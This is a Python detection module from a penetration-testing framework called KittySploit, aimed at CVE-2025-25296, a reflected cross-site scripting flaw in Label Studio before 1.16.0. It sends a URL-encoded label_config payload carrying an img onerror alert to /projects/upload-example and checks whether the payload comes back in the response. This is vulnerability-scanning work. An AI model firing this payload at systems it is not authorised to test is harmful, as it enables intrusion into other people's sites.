#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Label Studio prior to version 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Label Studio < 1.16.0 - Cross-Site Scripting Detection',
        'description': 'Label Studio prior to version 1.16.0 contains a cross-site scripting caused by rendering unsanitized user-provided HTML in the /projects/upload-example endpoint, letting attackers execute arbitrary JavaScript via crafted label_config in a GET request, exploit requires victims to visit malicious URL.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'label-studio', 'xss'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/HumanSignal/label-studio/security/advisories/GHSA-wpq5-3366-mqw4',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-25296',
        ],
        'cve': 'CVE-2025-25296',
    }

    def run(self):
        path = '/version'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/projects/upload-example/?label_config=%3CView%3E%3C!--%20%7B%22data%22%3A%20%7B%22text%22%3A%20%22%3Cdiv%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E%3C%2Fdiv%3E%22%7D%7D%20--%3E%3CHyperText%20name%3D%22text%22%20value%3D%22%24text%22%2F%3E%3C%2FView%3E'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<img src=x onerror=alert(document.domain)>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Label Studio < 1.16.0 - Cross-Site Scripting detected', path=path)
            return True
        return False

